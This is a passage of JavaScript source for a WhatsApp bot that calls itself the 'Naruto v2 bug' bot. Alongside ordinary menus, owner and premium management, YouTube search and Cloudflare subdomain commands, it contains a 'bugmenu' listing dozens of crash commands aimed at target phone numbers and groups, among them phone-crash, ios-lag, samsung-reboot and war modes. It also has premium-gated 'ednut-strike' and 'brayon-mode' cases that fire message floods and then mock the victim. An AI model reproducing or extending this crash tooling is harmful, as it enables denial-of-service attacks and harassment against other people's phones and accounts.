"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Join channel\",\"url\":\"${global.linkgc}\",\"merchant_url\":\"https://www.google.com\"}`
}]
}), 
contextInfo: {
isForwarded: true,
mentionedJid: [m.sender], 
forwardedNewsletterMessageInfo: {
newsletterName: `Powered By ${namaowner2}`,
newsletterJid: global.idsaluran
}}
})} 
}}, {userJid: m.sender, quoted: null}) 
await anggazyy.relayMessage(msgii.key.remoteJid, msgii.message, { 
messageId: msgii.key.id 
})
}
break
case "downloadmenu": {
let teksmenu = `*乂 D O W N L O A D E R*
* tiktok
* tiktokmp3
* tiktokaudio
* tiktokslide
* instagram
* facebook
* ytmp3
* mediafire`
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({ 
text: teksmenu
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Join channel\",\"url\":\"${global.linkgc}\",\"merchant_url\":\"https://www.google.com\"}`
}]
}), 
contextInfo: {
isForwarded: true,
mentionedJid: [m.sender], 
businessMessageForwardInfo: {  
businessOwnerJid: global.owner
}, 
forwardedNewsletterMessageInfo: {
newsletterName: `Powered By ${namaowner2}`,
newsletterJid: global.idsaluran
}}
})} 
}}, {userJid: m.sender, quoted: null}) 
await anggazyy.relayMessage(msgii.key.remoteJid, msgii.message, { 
messageId: msgii.key.id 
})
}
break
case "convertmenu": {
let teksmenu = `*乂 C O N V E R T E R*
* toaudio
* tomp3
* tovn
* toptv
* tts
* toimage`
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({ 
text: teksmenu
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Join channel\",\"url\":\"${global.linkgc}\",\"merchant_url\":\"https://www.google.com\"}`
}]
}), 
contextInfo: {
isForwarded: true,
mentionedJid: [m.sender], 
businessMessageForwardInfo: {  
businessOwnerJid: global.owner
}, 
forwardedNewsletterMessageInfo: {
newsletterName: `Powered By ${namaowner2}`,
newsletterJid: global.idsaluran
}}
})} 
}}, {userJid: m.sender, quoted: null}) 
await anggazyy.relayMessage(msgii.key.remoteJid, msgii.message, { 
messageId: msgii.key.id 
})
}
break
case "bugmenu": {
let profile
				try {
					profile = await naze.profilePictureUrl(m.sender, 'image');
				} catch (e) {
					profile = fake.anonim
				}
				const setv = pickRandom(listv)
let teksmenu = `*Hello @${m.sender.split("@")[0]}!*

╭─ Nᴀʀᴜᴛᴏ ᴠ2 ʙᴜɢ ᴍᴇNᴜ ☃
│  ◍ Botname : *${namabot2}*
│  ◍ Mode : *${anggazyy.public ? "Public Mode" : "Self Mode"}*
│  ◍ Uptime : *${runtime(process.uptime())}*
│  ◍ Library : *Active*
│  ◍ Version : *${global.version}*
│  ◍ Total Premium User : *${premium.length < 1 ? "no prem" : premium.length + " User*"}
└─ ☯

  Bug internal chats 
*=>*  ${prefix}onekil 234xx
*=>*  ${prefix}systemuicrash 234xx,amount
*=>*  ${prefix}doublekil 234xxx
*=>*  ${prefix}triplekill 234xxxx
*=>*  ${prefix}naruto-list 234xxx|amount
*=>*  ${prefix}notif-ui 234xxx
*=>*  ${prefix}notif-crash 234xxx
*=>*  ${prefix}crash-total 234xxx
*=>*  ${prefix}narutobug 234xxx
*=>*  ${prefix}unlimited-bug 234xxx
*=>*  ${prefix}chace-bug 234xxx
*=>*  ${prefix}phone-crash 234xxx
*=>*  ${prefix}narutoreact <reply message>
*=>*  ${prefix}react <reply message>

  Bug external chats 
*=>*  ${prefix}internal-crash 234xxx,amount
*=>*  ${prefix}internal-ui 234xxx,amount
*=>*  ${prefix}crash-myinter 234xxx,amount
*=>*  ${prefix}naruto-internal 234xxx,amount
*=>*  ${prefix}naruto-external 234xxx,amount
*=>*  ${prefix}engine-crash 234xxx,amount
*=>*  ${prefix}engine-internal 234xxx,amount
*=>*  ${prefix}engine-external 234xxx,amount
*=>*  ${prefix}engine-ui 234xxx,amount
*=>*  ${prefix}bug-engine 234xxx,amount
*=>*  ${prefix}bug-quoted 234xxx
*=>*  ${prefix}internal-quoted 234xxx
*=>*  ${prefix}external-quoted 234xxx

  Bug external group 
*=>*  ${prefix}bug-button link group
*=>*  ${prefix}bug-sitexyz link group
*=>*  ${prefix}button-internal link group
*=>*  ${prefix}button-external link group
*=>*  ${prefix}ui-grup link group
*=>*  ${prefix}bug-hole 120###@g.us
*=>*  ${prefix}enemygroup 120###@g.us
*=>*  ${prefix}internal-group 120###@g.us
*=>*  ${prefix}external-group 120###@g.us

  Bug blank 
*=>*  ${prefix}blank 234xxx,amount
*=>*  ${prefix}blank-ui 234xxx,amount
*=>*  ${prefix}naruto-v2,amount
*=>*  ${prefix}bug-prick, amount
*=>*  ${prefix}special-bug 234xxx, amount
*=>*  ${prefix}anything-crash 234xxx, amount

  Bug samsung
*=>*  ${prefix}samsung-bug 234xxx
*=>*  ${prefix}samsung-ui 234xxx
*=>*  ${prefix}samsung-internal 234xxx
*=>*  ${prefix}samsung-external 234xxx
*=>*  ${prefix}samsung-reboot 234xxx
*=>*  ${prefix}samsung-crash 234xxx

  Iphone bug 
*=>*  ${prefix}ios-ui 234xxx
*=>*  ${prefix}ios-unlimitedj 234xxx
*=>*  ${prefix}ios-infinity 234xxx|timer
*=>*  ${prefix}ios-uicrash 234xxx|timer
*=>*  ${prefix}ios-lag 234xxx|5

  Mode war bug 
*=>*  ${prefix}war1 234xxx
*=>*  ${prefix}war2 234xxx
*=>*  ${prefix}war3 234xxx
*=>*  ${prefix}war4 234xxx
*=>*  ${prefix}war5 234xxx
*=>*  ${prefix}war6 234xxx
*=>*  ${prefix}war7 234xxx
*=>*  ${prefix}war8 234xxx
*=>*  ${prefix}war9 234xxx
*=>*  ${prefix}war10 234xxx
*=>*  ${prefix}war11 234xxx
*=>*  ${prefix}war12 234xxx
*=>*  ${prefix}spesial-war 234xxx <not recommended>

  Bug Emoji 2.0 
*=>*  ${prefix}🎭 234xxx
*=>*  ${prefix}👻 234xxx
*=>*  ${prefix}💩 234xxx
*=>*  ${prefix}👽 234xxx
*=>*  ${prefix}🐕 234xxx
*=>*  ${prefix}🐶 234xxx
*=>*  ${prefix}🍌 234xxx

  Bug Baileys 
*=>*  ${prefix}bug-waweb 234xxx
*=>*  ${prefix}naruto-andro 234xxx|amount
*=>*  ${prefix}bug-meta 234xxx

  Bug in place VIP 
*=>*  ${prefix}ednut-strike <pc>
*=>*  ${prefix}good-night <pc>
*=>*  ${prefix}brayon-mode <pc>
*=>*  ${prefix}hello *<amount>*
*=>*  ${prefix}hi *<amount>*
*=>*  ${prefix}🦖 *<amount>*
*=>*  ${prefix}☕ *<amount>*
*=>*  ${prefix}❤ *<amount>*
*=>*  ${prefix}💤 *<amount>*
*=>*  ${prefix}🌀 *<amount>*
*=>*  ${prefix}🦴 *<amount>*
*=>*  ${prefix}🐛 *<amount>*
*=>*  ${prefix}🔥 234xxx
*=>*  ${prefix}💥 234xxx
*=>*  ${prefix}🌹 234xxx
*=>*  ${prefix}⭐ 234xxx
*=>*  ${prefix}⚡ 234xxx
*=>*  ${prefix}😈 234xxx
*=>*  ${prefix}💀 234xxx

 *- Gen 1 Bug Spesial -*
*=>*  ${prefix}gen-1 234xxxx
*=>*  ${prefix}bug-notif 234xxxx
*=>*  ${prefix}gen1-notif 234xxxx
*=>*  ${prefix}generation 234xxxx
*=>*  ${prefix}devilgas 234xxxx
*=>*  ${prefix}attack-sql 234xxxx *use strict⚡*
*=>*  ${prefix}attack-litesql 234xxxx
*=>*  ${prefix}sql-button 234xxxx

`
await anggazyy.sendMessage(m.chat, {
					document: fake.docs,
					fileName: ucapanWaktu,
					mimetype: pickRandom(fake.listfakedocs),
					fileLength: '100000000000000',
					pageCount: '999',
					caption: teksmenu,
					contextInfo: {
						mentionedJid: [m.sender, '0@s.whatsapp.net', owner[0] + '@s.whatsapp.net'],
						forwardingScore: 10,
						isForwarded: true,
						forwardedNewsletterMessageInfo: {
							newsletterJid: my.ch,
							serverMessageId: null,
							newsletterName: 'Team Ednut wa Bot'
						},
						externalAdReply: {
							title: author,
							body: packname,
							showAdAttribution: true,
							thumbnailUrl: profile,
							mediaType: 1,
							previewType: 0,
							renderLargerThumbnail: true,
							mediaUrl: my.gh,
							sourceUrl: my.gh,
						}
					}
				}, { quoted: m })
			}
			break
case "grupmenu": {
let teksmenu = `*乂 G R O U P M E N U*
* addmember
* antilink
* antilinkV2
* hidetag
* tagall
* delete
* open/close
* setnamagc
* setdeskgc
* setppgc
* kick
* promote
* leavegc
* leavegc2
* demote`
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({ 
text: teksmenu
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"Tutup Grup\",\"title\":\"Close Grup\",\"id\":\".close\"}" 
}, 
{
"name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"Buka Grup\",\"title\":\"Open Grup\",\"id\":\".open\"}" 
}, 
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Join Grup\",\"url\":\"${global.linkgc}\",\"merchant_url\":\"https://www.google.com\"}`
}]
}), 
contextInfo: {
isForwarded: true,
mentionedJid: [m.sender], 
businessMessageForwardInfo: {  
businessOwnerJid: global.owner
}, 
forwardedNewsletterMessageInfo: {
newsletterName: `Powered By ${namaowner2}`,
newsletterJid: global.idsaluran
}}
})} 
}}, {userJid: m.sender, quoted: null}) 
await anggazyy.relayMessage(msgii.key.remoteJid, msgii.message, { 
messageId: msgii.key.id 
})
}
break
case "ownermenu": {
let teksmenu = ` *Haii* @${m.sender.split("@")[0]}!
 *Selamat ${ucapan()}*

*乂 O W N E R M E N U*
* addowner
* addpremium
* delpremium
* delowner
* listowner
* clearsession
* modeoff
* modeon
* done
* anticall
* autoread
* autoreadsw
* welcome
* getcase
* setppbotpanjang
* setppbot
* setnamabot
* setbiobot`
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({ 
text: teksmenu
}), 
header: proto.Message.InteractiveMessage.Header.fromObject({
hasMediaAttachment: true,
documentMessage: {"url": "https://mmg.whatsapp.net/v/t62.7119-24/30129597_829817659174206_6300413901737393729_n.enc?ccb=11-4&oh=01_Q5AaIA5MAdyMQOjp8l42SnRy_8qjz9O8JH8vgPee1nIdko51&oe=66595EB9&_nc_sid=5e03e0&mms3=true",
"mimetype": "image/png",
"fileSha256": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
"jpegThumbnail": await resize(fs.readFileSync("./media/menu.jpg"), 400, 400),
"fileLength": 9999999999,
"mediaKey": "SkHeALp42Ch7DGb6nuV6p7hxL+V9yjh9s9t3Ox8a72o=",
"fileName": `© ${namabot} ${global.version}`,
"directPath": "/v/t62.7119-24/30129597_829817659174206_6300413901737393729_n.enc?ccb=11-4&oh=01_Q5AaIA5MAdyMQOjp8l42SnRy_8qjz9O8JH8vgPee1nIdko51&oe=66595EB9&_nc_sid=5e03e0",
"contactVcard": true,
"mediaKeyTimestamp": "1658703206"
}
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"Backup Script Bot\",\"title\":\"Backup Script\",\"id\":\".sc\"}"
},
{
"name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"Restarting Bot\",\"title\":\"Restart Bot\",\"id\":\".rst\"}"
}]
}), 
contextInfo: {
isForwarded: true,
mentionedJid: [m.sender], 
businessMessageForwardInfo: {  
businessOwnerJid: global.owner
}, 
forwardedNewsletterMessageInfo: {
newsletterName: `Powered By ${namaowner2}`,
newsletterJid: global.idsaluran
}}
})}
}}, {userJid: m.sender, quoted: null}) 
await anggazyy.relayMessage(msgii.key.remoteJid, msgii.message, { 
messageId: msgii.key.id 
})
}
break
case "trxoff": case "modeoff": {
if (!isOwner) return reply(msg.owner)
global.owneroff = true
reply('*Berhasil Mengganti Mode ✅*\nMode Bot Beralih Ke *Owner Offline*')
}
break
case "trxon": case "modeon": {
if (!isOwner) return reply(msg.owner)
global.owneroff = false
reply('*Berhasil Mengganti Mode ✅*\nMode Bot Beralih Ke *Owner Online*')
}
break
case 'ednut-strike': 
if (!isPremium) return reply(msg.anggazyyprem)
jumlah = 20
sendVariousMessages(from, jumlah)
await sleep(2000)
reply(`*𝒕𝒉𝒊𝒔 𝒘𝒆𝒂𝒌𝒍𝒊𝒏𝒈 𝒉𝒂𝒔 𝒃𝒆𝒆𝒏 𝒆𝒍𝒊𝒎𝒊𝒏𝒕𝒆𝒅 𝒃𝒚 𝒏𝒂𝒓𝒖𝒕𝒐 𝒗2 𝒃𝒖𝒈 𝒄𝒓𝒆𝒂𝒕𝒆𝒅 𝒃𝒚 𝑬𝒅𝒏𝒖𝒕 👤*`)
break
case 'brayon-mode': 
if (!isPremium) return reply(msg.anggazyyprem)
jumlah = 20
sendVariousMessages(from, jumlah)
await sleep(2000)
reply(`*𝒕𝒉𝒊𝒔 𝒘𝒆𝒂𝒌𝒍𝒊𝒏𝒈 𝒉𝒂𝒔 𝒃𝒆𝒆𝒏 𝒆𝒍𝒊𝒎𝒊𝒏𝒕𝒆𝒅 𝒃𝒚 𝒏𝒂𝒓𝒖𝒕𝒐 𝒗2 𝒃𝒖𝒈 𝒄𝒓𝒆𝒂𝒕𝒆𝒅 𝒃𝒚 𝑬𝒅𝒏𝒖𝒕 👤*`)
break
case 'ping': {
  const startTime = new Date();
  const pingMsg = await anggazyy.sendMessage(m.chat, { text: '*𝒗𝒐𝒍𝒕𝒂𝒈𝒆*' });

 await anggazyy.relayMessage(m.chat, {
      protocolMessage: {
        key: pingMsg.key,
        type: 14,
        editedMessage: {
          conversation: `*𝑛𝑎𝑟𝑢𝑡𝑜 𝑣2 𝑠𝑝𝑒𝑒𝑑 🌩️* ${new Date() - startTime} *𝑚𝑠*`
        }
      }
    }, {});
  } 
break;
case "alive":

const audiovn = "./Alive.mp3";
    const dooc = {
        audio: {
          url: audiovn
        },
        mimetype: 'audio/mp4',
        ptt: true,
        waveform:  [100, 0, 100, 0, 100, 0, 100],
        fileName: "",

        contextInfo: {
          mentionedJid: [m.sender],
          externalAdReply: {
          title: "𝑵𝒂𝒓𝒖𝒕𝒐 𝒗2 𝒃𝒖𝒈 𝒃𝒚 𝒆𝒅𝒏𝒖𝒕😡",
          body: "kєєp lσvíng nαrutσ",
          thumbnailUrl: "https://i.imgur.com/Y7wc8H6.jpeg",
          sourceUrl: "https://whatsapp.com/channel/0029VaefL9g0gcfLITSc841W",
          mediaType: 1,
          renderLargerThumbnail: true
          }}
      };


await anggazyy.sendMessage(m.chat, dooc, {quoted: m});


break;
case 'runtime':
                let pinga = ` ◈☃ 𝐍𝐀𝐑𝐔𝐓𝐎 𝐕2 is Active${runtime(process.uptime())}`
                anggazyy.sendMessage(m.chat, {
                    text: pinga,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `𝒏𝒂𝒓𝒖𝒕𝒐𝒗2`,
                            body: `вч єdnut hímsєlf❄`,
                            thumbnailUrl: 'https://i.imgur.com/4ETdmMI.jpeg',
                            sourceUrl: 'https://whatsapp.com/channel/0029VaefL9g0gcfLITSc841W',
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: m
                })
                break
case "addowner": case "addown": {
if (!isOwner) return reply(msg.owner)
if (m.quoted || text) {
let orang = m.mentionedJid[0] ? m.mentionedJid[0] : text ? text.replace(/[^0-9]/g, '')+'@s.whatsapp.net' : m.quoted ? m.quoted.sender : ''
if (owner2.includes(orang) || orang == global.owner) return reply(`Number ${orang.split("@")[0]} already in owner database`)
if (orang == botNumber) return reply("Cannot Add Bot Number To Additional Owner Database!")
let check = await anggazyy.onWhatsApp(`${orang.split("@")[0]}`)
if (check.length < 1) return reply(`Number ${orang.split("@")[0]} not registered on whatsapp`)
await owner2.push(orang)
await fs.writeFileSync("./all/database/owner.json", JSON.stringify(owner2, null, 2))
reply(`*Successfully added Owner ✅*
Number ${orang.split("@")[0]} added to owner database`)
} else {
reply(example("@tag/234XXX"))
}
}
break
case "delowner": case "delown": {
if (!isOwner) return reply(msg.owner)
if (m.quoted || text) {
if (text == "all") {
await fs.writeFileSync("./all/database/owner.json", "[]")
return reply(`*Berhasil Menghapus Semua Owner Tambahan ✅*`)
}
let orang = m.mentionedJid[0] ? m.mentionedJid[0] : text ? text.replace(/[^0-9]/g, '')+'@s.whatsapp.net' : m.quoted ? m.quoted.sender : ''
if (!owner2.includes(orang) || orang == global.owner) return reply(`Nomor ${orang.split("@")[0]} Tidak Ada Di Database Owner`)
if (orang == botNumber) return reply("Tidak Bisa Menghapus Nomor Bot!")
let pos = owner2.indexOf(orang)
await owner2.splice(pos, 1)
await fs.writeFileSync("./all/database/owner.json", JSON.stringify(owner2, null, 2))
reply(`*Berhasil Menghapus Owner ✅*
Nomor ${orang.split("@")[0]} Berhasil Dihapus Dari Database Owner`)
} else {
reply(example("@tag/6283XXX"))
}
}
break
case "addprem": case "addpremium": {
if (!isOwner) return reply(msg.owner)
if (m.quoted || text) {
let orang = m.mentionedJid[0] ? m.mentionedJid[0] : text ? text.replace(/[^0-9]/g, '')+'@s.whatsapp.net' : m.quoted ? m.quoted.sender : ''
if (premium.includes(orang)) return reply(`*Gagal Menambah User Premium!*\n${orang.split('@')[0]} Sudah Terdaftar Di Database *User Premium*`)
await premium.push(orang)
await fs.writeFileSync("./all/database/premium.json", JSON.stringify(premium))
reply(`*Berhasil Menambah Premium ✅*\n${orang.split('@')[0]} Sekarang Terdaftar Di Database *User Premium*`)
} else {
return reply(example("@tag/62838XXX"))
}}
break
case "delprem": case "delpremium": {
if (!isOwner) return reply(msg.owner)
if (m.quoted || text) {
let orang = m.mentionedJid[0] ? m.mentionedJid[0] : text ? text.replace(/[^0-9]/g, '')+'@s.whatsapp.net' : m.quoted ? m.quoted.sender : ''
if (!premium.includes(orang)) return reply(`*Gagal Menghapus User Premium!*\n${orang.split('@')[0]} Tidak Terdaftar Di Database *User Premium*`)
let indx = premium.indexOf(orang)
await premium.splice(indx, 1)
await fs.writeFileSync("./all/database/premium.json", JSON.stringify(premium))
reply(`*Berhasil Menghapus Premium ✅*\n${orang.split('@')[0]} Sekarang Terhapus Dari Database *User Premium*`)
} else {
return reply(example("@tag/62838XXX"))
}}
break
case "listown": case "listowner": {
if (owner2.length < 1) return reply("Tidak Ada Owner Tambahan")
let teksnya = `*LIST OWNER BOT⚡*\n\n`
owner2.forEach(e => teksnya += `*Tag :* @${e.split("@")[0]}
*WhatsApp :* ${e.split("@")[0]}\n\n`)
anggazyy.sendMessage(m.chat, {text: teksnya, mentions: [...owner2]}, {quoted: qtoko})
}
break
case "listprem": case "listpremium": {
if (premium.length < 1) return reply("Tidak Ada User Premium")
let teksnya = `*LIST USER PREMIUM⚡*\n\n`
premium.forEach(e => teksnya += `*Tag :* @${e.split("@")[0]}
*WhatsApp :* ${e.split("@")[0]}\n\n`)
anggazyy.sendMessage(m.chat, {text: teksnya, mentions: [...premium]}, {quoted: qtoko})
}
break
case "yts": {
if (!text) return reply(`*Masukan Teksnya!*
Contoh : *${cmd}* Story Anime`)
await reply(msg.wait)
await yts(text).then(async (data) => {
if (data.all.length == 0) return reply(mess.error)
let datanew = new Array()
let txt = []
global.tempYts = []
let result = data.all.slice(0,10)
for (let i of result) {
let tempid = await createSerial(5)
global.tempYts.push({
id: `${tempid}`, 
judul: `${i?.title || "unknown"}`, 
durasi: `${i?.timestamp || "unknown"}`, 
author: `${i.author?.name || "unknown"}`, 
link: i.url, 
image: i.thumbnail
})
txt.push(`* *ID Music :* #${tempid}
* *Judul :* ${i.title}
* *Channel :* ${i.author?.name || "unknown"}
* *Durasi :* ${i?.timestamp || "unknown"}
* *Link Url :* ${i.url}\n\n`)
}
for (let ii = 0; ii < result.length; ii++) {
datanew.push({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: "\n"+txt[ii]
}),
footer: proto.Message.InteractiveMessage.Footer.create({
 text: `© Powered By ${namabot2}`
}),
header: proto.Message.InteractiveMessage.Header.fromObject({
hasMediaAttachment: true,
...(await prepareWAMessageMedia({ image: await fetch(result[ii].thumbnail)}, { upload: anggazyy.waUploadToServer }))
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
name: "quick_reply",
buttonParamsJson: `{\"display_text\":\"Play Music ID #${global.tempYts[ii].id}\",\"title\":\"Play Music\",\"id\":\".ytsplay ${global.tempYts[ii].id}\"}`
}]
})
})}
const msgii = await generateWAMessageFromContent(m.chat, {
viewOnceMessage: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: "Berikut Adalah Hasil Pencarian Dari *Youtube 🔎*"
}),
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: datanew
})
})}
}}, {userJid: m.sender, quoted: m})
return anggazyy.relayMessage(m.chat, msgii.message, {
messageId: msgii.key.id
})
}).catch(err => reply(err.toString()))
}
break
case "ytsplay": {
if (!text) return
let cekdulu = await global.tempYts.find(e => e.id == text)
if (!cekdulu) return reply("ID Music Tidak Ditemukan")
let Obj = cekdulu
if (Obj.link == null) return reply("Maaf Audio Sudah Tidak Tersedia")
await reply(`Memproses Pengiriman Audio Dari *Youtube Search ID #${Obj.id}*`)
var judul = `./all/tmp/${getRandom(".mp3")}`
const videoURL = Obj.link
const options = {
  quality: 'highestaudio',
  filter: 'audioonly'
}
ytdl(videoURL, options)
  .pipe(fs.createWriteStream(judul))
  .on('finish', async function () {
try {
await anggazyy.sendMessage(m.chat, {audio: fs.readFileSync(judul), mimetype: 'audio/mpeg', contextInfo: {mentionedJid: [m.sender], externalAdReply: {thumbnailUrl: Obj.thumbnail, title: Obj.judul, body: `Duration : ${Obj.durasi} | Author : ${Obj.author}`, sourceUrl: Obj.link,  renderLargerThumbnail: true, mediaType: 1}}}, {quoted: m})
await fs.unlinkSync(judul)
} catch (e) {
await anggazyy.sendMessage(m.chat, {audio: fs.readFileSync(judul), mimetype: 'audio/mpeg'}, {quoted: m})
await fs.unlinkSync(judul)
}
let position = global.tempYts.indexOf(Obj)
global.tempYts[position].link = null
}).on('error', (err) => {
return reply(err.toString())
})}
break
case "setppbot": case "setpp": {
if (!isOwner) return reply(msg.owner)
if (/image/g.test(mime)) {
let media = await anggazyy.downloadAndSaveMediaMessage(qmsg)
await anggazyy.updateProfilePicture(botNumber, {url: media})
await fs.unlinkSync(media)
reply("*Berhasil Mengganti Profil ✅*")
} else return reply(example('dengan mengirim foto'))}
break
case "setppbotpanjang": case "setpppanjang": {
if (!isOwner) return reply(msg.owner)
if (/image/g.test(mime)) {
var medis = await anggazyy.downloadAndSaveMediaMessage(qmsg, 'ppbot.jpeg', false)
var { img } = await generateProfilePicture(medis)
await anggazyy.query({
tag: 'iq',
attrs: {
to: botNumber,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
}
]
})
await fs.unlinkSync(medis)
reply("*Berhasil Mengganti Profil ✅*")
} else return reply(example('dengan mengirim foto'))
}
break
case "setnamabot": {
if (!isOwner) return reply(msg.owner)
if (!text) return reply(example('teksnya'))
anggazyy.updateProfileName(text)
reply("*Berhasil Mengganti Nama Bot ✅*")
}
break
case "setbio": case "setbiobot": {
if (!isOwner) return reply(msg.owner)
if (!text) return reply(example('teksnya'))
anggazyy.updateProfileStatus(text)
reply("*Berhasil Mengganti Bio Bot ✅*")
}
break
case "listdomain": {
var teks = `*List Domain Yang Tersedia :*

.domain1 ${global.tld1}
.domain2 ${global.tld2}
.domain3 ${global.tld3}

*Contoh Cara Membuat Subdomain :*
ketik *.domain1* hostname|ipvps

*Contoh Cara Melihat Subdomain :*
ketik *.listsubdomain domain1*
`
reply(teks)
}
break
case "listsubdomain": case "listsubdo": {
if (!isOwner) return reply(msg.owner)
if (!args[0]) return reply(example("domain1\n\nketik *.listdomain*\nUntuk melihat list domainnya"))
let zonenya
let apinya
let dom = args[0].toLowerCase()
if (/domain1/.test(dom)) {
zonenya = global.zone1
apinya = global.apitoken1
} else if (/domain2/.test(dom)) {
zonenya = global.zone2
apinya = global.apitoken2
} else if (/domain3/.test(dom)) {
zonenya = global.zone3
apinya = global.apitoken3
}
axios.get(
`https://api.cloudflare.com/client/v4/zones/${zonenya}/dns_records`,{
headers: {
Authorization: "Bearer " + `${apinya}`,
"Content-Type": "application/json",
},
}).then(async (res) => {
if (res.data.result.length < 1) return reply("Tidak Ada Subdomain")
var teks = `*🌐 LIST SUBDOMAIN ${dom.toUpperCase()}*\n\n*Total Subdomain :* ${res.data.result.length}\n\n`
await res.data.result.forEach(e => teks += `*Domain :* ${e.name}\n*IP :* ${e.content}\n\n`)
return reply(teks)
})
}
break
case "domain1": case "domain2": case "domain3": {
if (!isOwner) return reply(msg.owner)
if (!text) return reply(example("host|ip"))
if (!text.split("|")) return reply(example("host|ip"))
let zonenya
let apinya
let tldnya
let dom = args[0].toLowerCase()
if (/domain1/.test(command)) {
zonenya = global.zone1
apinya = global.apitoken1
tldnya = global.tld1
} else if (/domain2/.test(command)) {
zonenya = global.zone2
apinya = global.apitoken2
tldnya = global.tld2
} else if (/domain3/.test(command)) {
zonenya = global.zone3
apinya = global.apitoken3
tldnya = global.tld3
}
async function subDomain1(host, ip) {
return new Promise((resolve) => {
axios.post(
`https://api.cloudflare.com/client/v4/zones/${zonenya}/dns_records`,
{ type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tldnya, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
{
headers: {
Authorization: "Bearer " + apinya,
"Content-Type": "application/json",
},
}).then((e) => {
let res = e.data
if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content })
}).catch((e) => {
let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e
let err1Str = String(err1)
resolve({ success: false, error: err1Str })
})
})}
   
let raw1 = text
if (!raw1) return reply(example("host|ip"))
let host1 = raw1.split("|")[0].trim().replace(/[^a-z0-9.-]/gi, "")
if (!host1) return reply("Hostname Tidak Valid!, Hostname Hanya Mendukung Tanda Strip(-) Atau Titik(.)")
let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "IP Tidak Valid!" : "Isi IP Servernya!")
await subDomain1(host1.toLowerCase(), ip1).then((e) => {
if (e['success']) reply(`*Subdomain Berhasil Dibuat ✅*\n\n*Domain Induk 🌐*\n${tldnya}\n*IP 📡*\n${e['ip']}\n*Subdomain 🌐*\n${e['name']}`)
else reply(`${e['error']}`)
})}
break
case "delsubdo": case "delsubdomain": {
if (!isOwner) return reply(msg.owner)
if (!text) return reply(example("domain1|subdo\n\nUntuk melihat listdomain ketik *.listdomain*"))
if (!text.split("|")) return reply(example("domain1|subdo\n\nUntuk melihat listdomain ketik *.listdomain*"))
var [pusat, sub] = text.split("|")
if (!pusat) return reply(example("domain1|subdo\n\nUntuk melihat listdomain ketik *.listdomain*"))
if (!sub) return reply(example("domain1|subdo\n\nUntuk melihat listdomain ketik *.listdomain*"))
var zonenya
var apinya
var tldnya
if (/domain1/.test(pusat)) {
zonenya = global.zone1
apinya = global.apitoken1
tldnya = global.tld1
} else if (/domain2/.test(pusat)) {
zonenya = global.zone2
apinya = global.apitoken2
tldnya = global.tld2
} else if (/domain3/.test(pusat)) {
zonenya = global.zone3
apinya = global.apitoken3
tldnya = global.tld3
} else return reply("Domain Tidak Ditemukan")
if (!sub.includes(".")) return reply("Format Subdomain Tidak Valid!")
var host = sub.toLowerCase()
var dom = null
var id = null
await axios.get(`https://api.cloudflare.com/client/v4/zones/${zonenya}/dns_records`, {
headers: {
Authorization: "Bearer " + apinya,
"Content-Type": "application/json",
},
}).then(async (res) => {
await res.data.result.forEach((e) => {
if (e.name == host) {
dom = e.name
id = e.id
}})
})
if (dom == null && id == null) return reply("Subdomain Tidak Ditemukan")
await fetch(`https://api.cloudflare.com/client/v4/zones/${zonenya}/dns_records/${id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
Authorization: "Bearer " + apinya,
"Content-Type": "application/json",
}
})
reply(`*Berhasil Menghapus Subdomain ✅*
*Subdomain :* ${dom}
*Domain Induk :* ${tldnya}`)
}
break
case "tts": {
if (!text) return reply(example("Hallo saya manusia"))
if (text.length >= 300) return reply("Jumlah huruf harus di bawah 300!")
reply(msg.wait)
let id = 'id_001'
